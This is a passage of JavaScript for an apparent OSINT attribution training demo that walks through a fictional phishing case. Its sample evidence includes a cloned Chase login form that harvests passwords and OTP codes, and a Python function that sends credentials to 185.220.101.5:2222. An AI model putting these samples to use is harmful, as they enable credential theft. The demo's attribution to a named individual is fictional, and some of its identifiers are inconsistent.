      code: `<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <title>Security Verification - Account Sign-in</title>\n  <link rel="stylesheet" href="/assets/auth.css">\n  <script src="/static/telemetry.js"></script>\n</head>\n<body>\n  <!-- CLONED CHASE BANKING VERIFICATION PORTAL -->\n  <form id="authForm" action="/api/v1/collect" method="POST">\n    <input type="text" name="username" placeholder="User ID" required />\n    <input type="password" name="password" placeholder="Password" required />\n    <input type="text" name="otp_token" placeholder="Security Code" />\n    <button type="submit">Verify Identity</button>\n  </form>\n  <!-- Operator payload drops to XMR Escrow: bc1q9...fjh -->\n</body>\n</html>`
    },
    {
      id: "staging_config",
      type: "scripts",
      name: "deploy.json (Staging Portal Config)",
      path: "https://alex-devlabs.ru/config/deploy.json",
      tag: "JSON", icon: "JSON",
      badge: "JSON API",
      badgeClass: "se-badge-200",
      contentType: "application/json",
      size: "1.2 KB",
      lines: 28,
      headers: "Server: Caddy\nContent-Type: application/json\nAccess-Control-Allow-Origin: *",
      code: `{\n  "environment": "staging",\n  "operator_handle": "aperry-sec",\n  "contact_email": "alex_darknet99@proton.me",\n  "upstream_proxy": "185.220.101.5",\n  "modules": [\n    "cred_stealer_v2",\n    "otp_interceptor",\n    "session_hijack"\n  ],\n  "pgp_key_id": "7F82C914B3014A19",\n  "build_pipeline": "github.com/aperry-sec/phishkit-core"\n}`
    },
    {
      id: "git_repo_script",
      type: "scripts",
      name: "engine.py (Threat Kit Core)",
      path: "github.com/aperry-sec/phishkit-core/engine.py",
      tag: "PY", icon: "PY",
      badge: "Python 3",
      badgeClass: "se-badge-file",
      contentType: "text/x-python",
      size: "3.4 KB",
      lines: 95,
      headers: "Repository: github.com/aperry-sec/phishkit-core\nBranch: main\nAuthor: Alexander Perry <alex_darknet99@proton.me>",
      code: `import socket\nimport json\n\n# Autonomous Credential Collector\nOPERATOR_KEY = "7F82 C914 B301 4A19"\nTELEMETRY_ENDPOINT = "185.220.101.5:2222"\n\ndef exfiltrate_credentials(payload):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(("185.220.101.5", 2222))\n    sock.sendall(json.dumps(payload).encode())\n    sock.close()\n\nif __name__ == "__main__":\n    print(f"Agent online. Bound to PGP key {OPERATOR_KEY}")`
    },
    {
      id: "ssl_cert_item",
      type: "network",
      name: "Let's Encrypt TLS (SN: 04fa8b)",
      path: "chase-secure-verification.xyz · alex-devlabs.ru",
      tag: "CERT", icon: "CERT",
      badge: "TLS 1.3",
      badgeClass: "se-badge-ssl",
      contentType: "security/x509",
      size: "2.1 KB",
      lines: 18,
      headers: "Protocol: TLSv1.3\nCipher: TLS_AES_256_GCM_SHA384\nValid-To: 2027-01-12",
      code: `-----BEGIN CERTIFICATE-----\nIssuer: C=US, O=Let's Encrypt, CN=R3\nSubject: CN=chase-secure-verification.xyz\nSerial Number: 04:FA:8B:29:11:9C:38:D2\nValidity:\n  Not Before: Oct 14 00:00:00 2026 GMT\n  Not After : Jan 12 23:59:59 2027 GMT\nSubject Alternative Names (SANs):\n  - chase-secure-verification.xyz (Phishing Seed)\n  - alex-devlabs.ru (Developer Staging Domain)\nSHA-256 Fingerprint:\n  D4:A8:19:C2:5E:7B:90:13:FF:6A:B2:44:81:90:3C:7F\n-----END CERTIFICATE-----`
    },
    {
      id: "dns_ip_host",
      type: "network",
      name: "185.220.101.5 (Bulletproof Host)",
      path: "AS49981 Stark Industries (Amsterdam, NL)",
      tag: "DNS", icon: "DNS",
      badge: "IP DNS",
      badgeClass: "se-badge-200",
      contentType: "network/ipv4",
      size: "32 B",
      lines: 10,
      headers: "ASN: AS49981\nCountry: NL\nPorts: 80, 443, 2222",
      code: `;; QUESTION SECTION:\n;chase-secure-verification.xyz. IN A\n\n;; ANSWER SECTION:\nchase-secure-verification.xyz. 300 IN A 185.220.101.5\n\n;; REVERSE DNS PTR:\n185.220.101.5.in-addr.arpa. 300 IN PTR bulletproof-relay-02.stark-dc.nl`
    },
    {
      id: "crypto_escrow",
      type: "network",
      name: "XMR/BTC Escrow (bc1q9...fjh)",
      path: "bc1q9w3xkz7v82m6pqj481d9fjh",
      tag: "KEY", icon: "KEY",
      badge: "3.84 BTC",
      badgeClass: "se-badge-port",
      contentType: "crypto/ledger",
      size: "128 B",
      lines: 8,
      headers: "Network: Bitcoin Mainnet\nMixer Hops: 2\nExchange: Garantex KYC",
      code: `{\n  "wallet_address": "bc1q9w3xkz7v82m6pqj481d9fjh",\n  "currency": "BTC",\n  "total_received": "3.84000000 BTC",\n  "unspent_outputs": 2,\n  "associated_actor": "Alexander Perry",\n  "exchange_cluster": "Garantex Deposit Address"\n}`
    }
  ];

  siteExplorerState.items = defaultItems;
  updateExplorerCounts({
    target: "chase-secure-verification.xyz",
    pages: [{ url: "/" }, { url: "/assets/auth.css" }],
    open_ports: [{ port: 80 }, { port: 443 }, { port: 2222 }],
    ssl_info: { subject: "chase-secure-verification.xyz" }
  });
  renderExplorerTree();
  if (defaultItems.length) {
    selectExplorerItem(defaultItems[0]);
  }
}

function escapeHtml(str) {
  if (str === null || str === undefined) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function selectEntityNode(entity) {
  selectedEntityId = entity.id;

  // Sync with Site Explorer if matching item exists
  if (siteExplorerState.items && siteExplorerState.items.length) {
    const match = siteExplorerState.items.find(i => 
      i.name.includes(entity.name) || 
      entity.name.includes(i.name) || 
      (entity.details?.url && i.path === entity.details.url)
    );
    if (match) selectExplorerItem(match);
  }

  const nameEl = document.getElementById("ndName");
  const tierEl = document.getElementById("ndTier");
  const gEl = document.getElementById("ndG");
  const hEl = document.getElementById("ndH");
  const fEl = document.getElementById("ndF");
  const costEl = document.getElementById("ndCost");

  if (nameEl) nameEl.textContent = entity.name;
  if (tierEl) tierEl.textContent = `TIER ${entity.tier} · ${entity.entity_type}`;
  if (gEl) gEl.textContent = (entity.g || 0).toFixed(2);
  if (hEl) hEl.textContent = (entity.h || 0).toFixed(2);
  if (fEl) fEl.textContent = (entity.f || 0).toFixed(2);
  if (costEl) costEl.textContent = `w = ${(entity.cost || 0).toFixed(1)}`;

  logTerminal(`Inspecting: ${entity.name} [Tier ${entity.tier}] | g=${(entity.g||0).toFixed(1)} h=${(entity.h||0).toFixed(1)}`);
}

// -------------------------------------------------------------
// Controls & Buttons Binding
// -------------------------------------------------------------
function bindControls() {
  const btnPlay = document.getElementById("btnPlayDemo");
  if (btnPlay) btnPlay.addEventListener("click", playGuidedDemo);

  const btnInvestigate = document.getElementById("btnRunInvestigation");
  if (btnInvestigate) btnInvestigate.addEventListener("click", runAutonomousInvestigation);

  const btnTrace = document.getElementById("btnTraceAStar");
  if (btnTrace) btnTrace.addEventListener("click", traceAStarPath);

  const btnReset = document.getElementById("btnResetGraph");
  if (btnReset) btnReset.addEventListener("click", resetGraphView);

  const btnSolveAStar = document.getElementById("btnSolveAStar");
  if (btnSolveAStar) btnSolveAStar.addEventListener("click", traceAStarPath);

  const btnStepAStar = document.getElementById("btnStepAStar");
  if (btnStepAStar) btnStepAStar.addEventListener("click", stepAStarNode);

  const btnResetAStar = document.getElementById("btnResetAStar");
  if (btnResetAStar) btnResetAStar.addEventListener("click", resetAStarStepper);

  // Bayes All / Reset
  const btnAllSensors = document.getElementById("btnToggleAllSensors");
  if (btnAllSensors) {
    btnAllSensors.addEventListener("click", () => {
      document.querySelectorAll(".sensor-btn, .btn-sensor").forEach(btn => {
        const s = btn.dataset.sensor;
        if (s) activeSensors.add(s);
        btn.classList.add("active");
        const st = btn.querySelector(".chip-status");
        if (st) st.textContent = "ON";
      });
      updateBayesFromSensors();
    });
  }

  const btnResetSensors = document.getElementById("btnResetSensors");
  if (btnResetSensors) {
    btnResetSensors.addEventListener("click", () => {
      activeSensors.clear();
      document.querySelectorAll(".sensor-btn, .btn-sensor").forEach(btn => {
        btn.classList.remove("active");
        const st = btn.querySelector(".chip-status");
        if (st) st.textContent = "OFF";
      });
      updateBayesFromSensors();
    });
  }

  // OpSec MDP Actions
  const mdpActions = {
    "passive-ct": {
      description: "Просмотр журнала сертификатов",
      reward: "+8.5",
      risk: "0.02 (Безопасно)",
      v: "18.42",
      status: "Пассивное наблюдение",
      warning: false
    },
    "dns-enum": {
      description: "Просмотр записей DNS",
      reward: "+6.0",
      risk: "0.08 (Безопасно)",
      v: "14.20",
      status: "DNS",
      warning: false
    },
    "whois-rdap": {
      description: "Просмотр регистрации домена",
      reward: "+7.0",
      risk: "0.05 (Безопасно)",
      v: "16.10",
      status: "RDAP",
      warning: false
    },
    "active-nmap": {
      description: "Активная проверка в модели",
      reward: "+4.0",
      risk: "0.89 (КРИТИЧЕСКИЙ РИСК)",
      v: "3.50",
      status: "Повышенный риск",
      warning: true
    }
  };

  document.querySelectorAll(".mdp-action-btn").forEach(btn => {
    btn.addEventListener("click", () => {
      document.querySelectorAll(".mdp-action-btn").forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      const actKey = btn.dataset.action;
      const data = mdpActions[actKey];
      if (!data) return;

      const cmdEl = document.getElementById("mdpCommand");
      const rEl = document.getElementById("mdpRewardVal");
      const riskEl = document.getElementById("mdpRiskVal");
      const vEl = document.getElementById("mdpVVal");
      const stEl = document.getElementById("mdpActionStatus");
      const warnEl = document.getElementById("aggressiveWarning");

      if (cmdEl) cmdEl.textContent = data.description;
      if (rEl) rEl.textContent = data.reward;
      if (riskEl) {
        riskEl.textContent = data.risk;
        riskEl.classList.toggle("risk-high", data.warning);
      }
      if (vEl) vEl.textContent = data.v;
      if (stEl) {
        stEl.textContent = data.status;
        stEl.classList.toggle("risk-high", data.warning);
      }
      if (warnEl) {
        if (data.warning) warnEl.classList.add("show");
        else warnEl.classList.remove("show");
      }

      logTerminal(`Bellman MDP evaluated action [${actKey}]: V*(s)=${data.v}, Risk=${data.risk}`, data.warning ? "navy" : "highlight");
    });
  });

  const btnClearTerm = document.getElementById("btnClearTerminal");
  if (btnClearTerm) {
    btnClearTerm.addEventListener("click", () => {
      const term = document.getElementById("terminalBody");
      if (term) term.innerHTML = "";
      logTerminal("Log stream cleared.");
    });
  }

  // Sensor Evidence Chips
  const sensorBtns = document.querySelectorAll(".sensor-btn, .btn-sensor");
  sensorBtns.forEach(btn => {
    btn.addEventListener("click", () => {
      const sensor = btn.dataset.sensor;
      if (activeSensors.has(sensor)) {
        activeSensors.delete(sensor);
        btn.classList.remove("active");
        btn.querySelector(".chip-status").textContent = "OFF";
      } else {
        activeSensors.add(sensor);
        btn.classList.add("active");
        btn.querySelector(".chip-status").textContent = "ON";
      }
      updateBayesFromSensors();
    });
  });
}

function updateBayesFromSensors() {
  const count = activeSensors.size;
  const probs = [10.0, 48.0, 84.5, 96.8, 99.9];
  const p = probs[Math.min(count, 4)];

  const probDisp = document.getElementById("bayesProbDisplay");
  const probBar = document.getElementById("bayesProbBar");
  const verdictBadge = document.getElementById("bayesVerdictBadge");

  if (probDisp) probDisp.textContent = `${p.toFixed(1)}%`;
  if (probBar) probBar.style.width = `${p}%`;

  if (verdictBadge) {
    if (p >= 99.0) {
      verdictBadge.textContent = "Высокая вероятность в учебной модели";
      highlightNode("actor_alex_perry", true);
    } else if (p >= 80.0) {
      verdictBadge.textContent = "Высокая корреляция (Кандидат найден)";
    } else if (p > 10.0) {
      verdictBadge.textContent = "Первичная привязка улик";
    } else {
      verdictBadge.textContent = "Требуются улики";
    }
  }

  logTerminal(`Bayesian update: ${count} evidence sources active ➔ P(Actor|E) = ${p.toFixed(1)}%`, p > 90 ? "highlight" : "navy");
}

// -------------------------------------------------------------
// Guided 5-Stage Demo: "Operation DarkPhish"
// -------------------------------------------------------------
async function playGuidedDemo() {
  if (isDemoRunning) return;
  isDemoRunning = true;

  const pill = document.getElementById("demoStatusPill");
  const pillText = document.getElementById("demoStatusText");
  if (pill) pill.classList.add("running");
  if (pillText) pillText.textContent = "Investigation Active";

  logTerminal("▶ Initiating Operation DarkPhish Guided Demo", "highlight");

  const steps = [
    { id: "domain_phish_01", delay: 700, sensor: null, msg: "Stage 1: Ingesting seed phishing domain chase-secure-verification.xyz" },
    { id: "ip_bulletproof", delay: 700, sensor: null, msg: "Stage 1.5: DNS resolves to bulletproof host 185.220.101.5" },
    { id: "ssl_cert_sn", delay: 800, sensor: "ev_ct_cert", msg: "Stage 2: CT logs reveal SSL Cert SN 04fa8b with Subject Alternative Name" },
    { id: "domain_old_portfolio", delay: 800, sensor: null, msg: "Stage 2.5: Pivot to developer staging portal alex-devlabs.ru" },
    { id: "email_registrant", delay: 800, sensor: "ev_whois_proton", msg: "Stage 3: WHOIS recovery email matches alex_darknet99@proton.me" },
    { id: "handle_github", delay: 800, sensor: "ev_github_cadence", msg: "Stage 4: GitHub dev_alexperry commit cadence aligns with UTC+3" },
    { id: "actor_alex_perry", delay: 1000, sensor: "ev_pgp_key", msg: "Stage 5: PGP Key 4A89C19F confirms physical identity: Alexander Perry (99.0%)" }
  ];

  resetGraphView();

  for (let i = 0; i < steps.length; i++) {
    const s = steps[i];
    await sleep(s.delay);

    highlightNode(s.id, true);
    if (i > 0) {
      highlightLink(steps[i - 1].id, s.id, true);
    }

    if (s.sensor) {
      activeSensors.add(s.sensor);
      const btn = document.querySelector(`[data-sensor="${s.sensor}"]`);
      if (btn) {
        btn.classList.add("active");
        btn.querySelector(".chip-status").textContent = "ON";
      }
      updateBayesFromSensors();
    }

    logTerminal(s.msg, i === steps.length - 1 ? "highlight" : "navy");

    if (currentGraph) {
      const e = currentGraph.entities.find(ent => ent.id === s.id);
      if (e) selectEntityNode(e);
    }
  }

  const astarStatus = document.getElementById("astarStatus");
  const astarCost = document.getElementById("astarCost");
  if (astarStatus) astarStatus.textContent = "Solved (Optimal)";
  if (astarCost) astarCost.textContent = "Cost: 10.50 | Expansions: 7";

  logTerminal("✔ Operation DarkPhish resolved: Alexander Perry unmasked.", "highlight");

  if (pill) pill.classList.remove("running");
  if (pillText) pillText.textContent = "Resolved · Complete";
  isDemoRunning = false;
}

// -------------------------------------------------------------
// Trace A* Path Only
// -------------------------------------------------------------
async function traceAStarPath() {
  resetGraphView();
  try {
    const result = await caseApi("/api/search");
    showCasePath(result);
    logTerminal(`A* ran on the training graph · cost ${result.total_cost} · ${result.nodes_expanded} expanded`, "highlight");
  } catch (error) {
    logTerminal(error.message, "highlight");
  }
}

async function caseApi(path, body = {}) {
  const response = await fetch(path, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(body),
  });
  if (!response.ok) throw new Error(`Training API unavailable (${response.status})`);
  return response.json();
}

function showCasePath(result) {
  result.optimal_path.forEach((id, index) => {
    highlightNode(id, true);
    if (index) highlightLink(result.optimal_path[index - 1], id, true);
  });
  const status = document.getElementById("astarStatus");
  const cost = document.getElementById("astarCost");
  if (status) status.textContent = result.path_found ? "Training path found" : "No path";
  if (cost) cost.textContent = `Стоимость: ${result.total_cost ?? "—"} · Просмотрено узлов: ${result.nodes_expanded}`;
}

async function runAutonomousInvestigation() {
  try {
    const result = await caseApi("/api/agent/investigate");
    resetGraphView();
    showCasePath(result.pivot_search_result);
    const probability = document.getElementById("bayesProbDisplay");
    const bar = document.getElementById("bayesProbBar");
    const score = (result.final_attribution_confidence * 100).toFixed(2) + "%";
    if (probability) probability.textContent = score;
    if (bar) bar.style.width = score;
    logTerminal(`Fictional case · model posterior ${score} · Bellman iterations: ${result.mdp_plan.iterations}`, "highlight");
  } catch (error) {
    logTerminal(error.message, "highlight");
  }
}

function highlightNode(id, isActive) {
  const rect = document.getElementById(`rect-${id}`);
  if (!rect) return;
  if (isActive) {
    if (id === "actor_alex_perry") {
      rect.setAttribute("fill", "#36765a");
      rect.setAttribute("stroke", "#36765a");
      const parent = rect.parentElement;
      if (parent) {
        parent.querySelectorAll("text").forEach(t => t.setAttribute("fill", "#ffffff"));
      }
    } else {
      rect.setAttribute("fill", "#d9edbd");
      rect.setAttribute("stroke", "#d9edbd");
      const parent = rect.parentElement;
      if (parent) {
        parent.querySelectorAll("text").forEach(t => t.setAttribute("fill", "#172f25"));
      }
    }
  } else {
    rect.setAttribute("fill", id === "actor_alex_perry" ? "#e6f0df" : "#ffffff");
    rect.setAttribute("stroke", id === "actor_alex_perry" ? "#36765a" : "#8ea89a");
    const parent = rect.parentElement;
    if (parent) {
      const texts = parent.querySelectorAll("text");
      if (texts[0]) texts[0].setAttribute("fill", id === "actor_alex_perry" ? "#36765a" : "#435b50");
      if (texts[1]) texts[1].setAttribute("fill", "#172f25");
    }
  }
}

function highlightLink(source, target, isActive) {
  const line = document.getElementById(`link-${source}-${target}`);
  if (!line) return;
  if (isActive) {
    line.setAttribute("stroke", "#285c48");
    line.setAttribute("stroke-width", "2");
    line.setAttribute("stroke-opacity", "1");
  } else {
    line.setAttribute("stroke", "#8ea89a");
    line.setAttribute("stroke-width", "1.5");
    line.setAttribute("stroke-opacity", "1");
  }
}

function resetGraphView() {
  resetGraphViewport();
  if (!currentGraph) return;

  currentGraph.entities.forEach(e => highlightNode(e.id, false));
  currentGraph.links.forEach(l => highlightLink(l.source, l.target, false));

  activeSensors.clear();
  document.querySelectorAll(".sensor-btn, .btn-sensor").forEach(btn => {
    btn.classList.remove("active");
    btn.querySelector(".chip-status").textContent = "OFF";
  });

  const probDisp = document.getElementById("bayesProbDisplay");
  const probBar = document.getElementById("bayesProbBar");
  if (probDisp) probDisp.textContent = "10.0%";
  if (probBar) probBar.style.width = "10%";

  const astarStatus = document.getElementById("astarStatus");
  const astarCost = document.getElementById("astarCost");
  if (astarStatus) astarStatus.textContent = "Standby";
  if (astarCost) astarCost.textContent = "Cost: -- | Expansions: --";

  const pillText = document.getElementById("demoStatusText");
  if (pillText) pillText.textContent = "Standby · Ready";

  logTerminal("Topology view reset.");
}

function logTerminal(msg, type = "normal") {
  const term = document.getElementById("terminalBody");
  if (!term) return;

  const now = new Date();
  const ts = `[${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}]`;

  const entry = document.createElement("div");
  entry.className = "log-entry";
  const timeEl = document.createElement("span");
  timeEl.className = "log-ts";
  timeEl.textContent = ts;
  const messageEl = document.createElement("span");
  messageEl.className = `log-msg ${["normal", "highlight", "navy"].includes(type) ? type : "normal"}`;
  messageEl.textContent = msg;
  entry.append(timeEl, messageEl);
  term.appendChild(entry);
  term.scrollTop = term.scrollHeight;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// -------------------------------------------------------------
